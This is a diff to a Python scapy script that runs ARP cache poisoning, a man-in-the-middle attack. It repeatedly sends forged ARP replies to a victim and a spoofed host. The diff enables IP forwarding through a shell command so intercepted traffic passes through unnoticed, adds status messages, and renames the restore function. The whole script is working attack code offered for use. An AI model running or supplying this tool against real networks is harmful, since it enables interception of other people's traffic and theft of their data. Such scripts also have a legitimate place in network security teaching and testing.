@@ -3,20 +3,23 @@
 from scapy.all import ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, send
 import time
 import sys
+import os
 
 
 def poison(target_ip, target_mac, source_ip):
     packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
-    send(packet)
+    send(packet, verbose=False)
 
 
-def antidote(target_ip, target_mac, source_ip, source_mac):
+def heal(target_ip, target_mac, source_ip, source_mac):
     packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
                  pdst=target_ip, hwdst=target_mac)
-    send(packet)
+    send(packet, verbose=False)
 
 
 if __name__ == "__main__":
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
     if len(sys.argv) != 3:
         print("Incorrect number of arguments!")
         exit(1)
@@ -33,9 +36,11 @@ if __name__ == "__main__":
 
     try:
         while True:
+            print("Poisoning ARP table...")
             poison(spoof_ip, spoof_mac, victim_ip)
             poison(victim_ip, victim_mac, spoof_ip)
             time.sleep(2)
     except:
-        antidote(victim_ip, victim_mac, spoof_ip, spoof_mac)
-        antidote(spoof_ip, spoof_mac, victim_ip, victim_mac)
+        print("Healing ARP table...")
+        heal(victim_ip, victim_mac, spoof_ip, spoof_mac)
+        heal(spoof_ip, spoof_mac, victim_ip, victim_mac)
